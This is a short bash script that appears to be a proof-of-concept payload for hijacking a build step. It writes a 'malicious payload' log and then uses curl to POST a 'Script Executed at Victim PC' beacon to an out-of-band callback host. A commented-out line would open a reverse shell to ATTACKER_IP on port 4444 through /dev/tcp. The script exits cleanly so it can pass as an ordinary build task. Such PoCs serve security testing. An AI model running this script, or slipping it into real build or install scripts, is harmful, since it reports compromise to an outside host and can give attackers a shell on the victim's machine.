#!/usr/bin/env bash
set -e
echo "[*] Executing malicious payload..." >> ~/malicious_payload.log
curl -X POST 'http://ualemtwhjnfuiyibdavginia98b8az25y.oast.fun/log' -d 'Script Executed at Victim PC'

# Example destructive (or high impact) payload -- for PoC purposes, we use a benign command
# For a reverse shell (do not enable in production without authorization):
# bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Continue with original build tasks (if needed) or exit
exit 0
